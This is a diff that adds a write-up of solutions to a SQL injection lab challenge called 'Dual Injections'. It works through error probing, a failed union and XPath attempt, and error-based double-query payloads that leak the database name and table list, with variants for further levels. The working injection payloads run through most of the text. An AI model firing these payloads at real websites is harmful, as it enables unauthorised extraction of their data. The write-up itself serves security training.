@@ -1,6 +1,31 @@
 Solutions of Dual Injections challenge (SQL Ninja):
+(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html)
 
 #1.
-#2.
-#3.
-#4.
++ Put single quote at the end of url, get SQL error:
+"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ") limit 1' at line 1"
++ Guess SQL query: select ... where (id=...) limit 1
+Try ...?id=1) --+ not get SQL error
++ Try union-based injection:
+Find max(n) such that try ...?id=1) order by n --+ not get error "Error While Selection process : Unknown column ..."
+(in this case, max(n)=5)
+Try ...?id=1) union select 1,2,3,4,5 --+ we get message like ...?id=1
+So, we cannot use union-based injection
++ Try XPath injection:
+Try ...?id=1) and extractvalue() --+
+and ...?id=1) and updatexml() --+
+We get error: "Xpath Function is Disabled by the Admin"
+So, we cannot use XPath injection
++ Try dual injection:
+Try (multiple times)...?id=1) and (select 1 from (select count(*), (concat((select database()), 0, floor(rand()*2)))a from information_schema.tables group by a) b)--+
+We get error: "Error While Selection process : Duplicate entry 'leettime_761wHole00' for key 'group_key'"
+So, we can use dual injection
++ Get information:
+...?id=1) and (select 1 from (select count(*), (concat((<SQL query to return single row>), 0, floor(rand()*2)))a from information_schema.tables group by a) b)--+
+
+Ex: List of tables: ...?id=1) and (select 1 from (select count(*), (concat((select group_concat(table_name) from information_schema.tables where table_schema=database()), 0, floor(rand()*2)))a from information_schema.tables group by a) b)--+
+
+Similar to #2,#3,#4:
+#2. ...?id=1") ... --+
+#3. ...?id=1') ... --+
+#4. ...?id=1'))a ... --+
